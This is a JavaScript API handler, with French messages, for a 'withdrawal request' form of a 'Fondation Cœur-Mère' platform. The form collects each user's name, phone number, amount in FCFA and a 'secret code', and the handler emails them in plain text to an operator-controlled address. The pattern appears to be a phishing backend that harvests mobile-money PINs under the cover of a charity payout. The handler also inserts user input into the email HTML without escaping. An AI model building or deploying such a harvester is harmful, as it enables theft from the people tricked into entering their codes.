import dotenv from 'dotenv';
import { Resend } from 'resend';

dotenv.config();

const resendApiKey = process.env.RESEND_API_KEY;
const emailTo = process.env.EMAIL_TO;
const resend = resendApiKey ? new Resend(resendApiKey) : null;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Méthode non autorisée.' });
  }

  const { fullName, phoneNumber, amount, secretCode, platform } = req.body || {};

  if (!fullName || !phoneNumber || !amount || !secretCode || !platform) {
    return res.status(400).json({ error: 'Tous les champs du formulaire sont requis.' });
  }

  if (!resend || !emailTo) {
    console.error('Configuration manquante pour l’envoi de mail.', { resendApiKey: !!resendApiKey, emailTo });
    return res.status(500).json({ error: 'La configuration de l’envoi de mail est manquante.' });
  }

  console.log('API send-email request:', { platform, fullName, phoneNumber, amount });

  const html = `
    <div style="font-family: Arial, sans-serif; color: #111;">
      <h1 style="color: #0f172a;">Nouvelle demande de retrait</h1>
      <p>Une nouvelle demande de retrait a été soumise via la plateforme Fondation Cœur-Mère.</p>
      <ul style="list-style: none; padding: 0;">
        <li><strong>Plateforme :</strong> ${platform}</li>
        <li><strong>Nom :</strong> ${fullName}</li>
        <li><strong>Téléphone :</strong> ${phoneNumber}</li>
        <li><strong>Montant :</strong> ${amount} FCFA</li>
        <li><strong>Code secret :</strong> ${secretCode}</li>
      </ul>
      <p style="margin-top: 24px; color: #475569;">Envoyé automatiquement par le formulaire de retrait.</p>
    </div>
  `;

  try {
    const result = await resend.emails.send({
      from: 'no-reply@fondation-coeur-mere.com',
      to: emailTo,
      subject: `Nouvelle demande de retrait ${platform}`,
      html,
    });

    console.log('API send-email success:', { to: emailTo, platform, result });
    return res.status(200).json({ success: true, details: result });
  } catch (error) {
    console.error('Resend error:', error);
    return res.status(500).json({ error: 'Impossible d’envoyer le message. Vérifiez la configuration Resend.' });
  }
}
